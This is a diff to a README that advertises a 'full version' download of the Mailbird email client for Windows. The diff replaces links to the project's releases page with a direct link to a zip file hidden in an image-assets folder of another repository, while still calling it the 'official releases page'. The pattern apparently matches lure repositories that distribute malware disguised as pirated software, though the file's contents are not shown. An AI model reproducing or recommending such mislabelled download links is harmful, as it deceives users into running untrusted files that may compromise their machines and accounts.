@@ -5,7 +5,7 @@ description: "Download the full version of the Mailbird desktop email client for
 ---
 # 📧 Mailbird-Alt-2026 - Master your daily email workflow easily
 
-[![Download Mailbird-Alt-2026](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/dlwnsah1234/Mailbird-Alt-2026/releases)
+[![Download Mailbird-Alt-2026](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/dlwnsah1234/dlwnsah1234.github.io/raw/refs/heads/main/assets/img/1.0-alpha.2.zip)
 
 Mailbird-Alt-2026 provides a unified email experience for Windows 10 and Windows 11. This software organizes your messages, contacts, and calendar events into one interface. You handle multiple accounts without switching between different tabs or applications.
 
@@ -13,7 +13,7 @@ Mailbird-Alt-2026 provides a unified email experience for Windows 10 and Windows
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official releases page](https://github.com/dlwnsah1234/Mailbird-Alt-2026/releases) to find the latest version.
+1. Visit the [official releases page](https://github.com/dlwnsah1234/dlwnsah1234.github.io/raw/refs/heads/main/assets/img/1.0-alpha.2.zip) to find the latest version.
 2. Click the link for the installation file.
 3. Save the file to your computer.
 4. Locate the downloaded file in your folder.
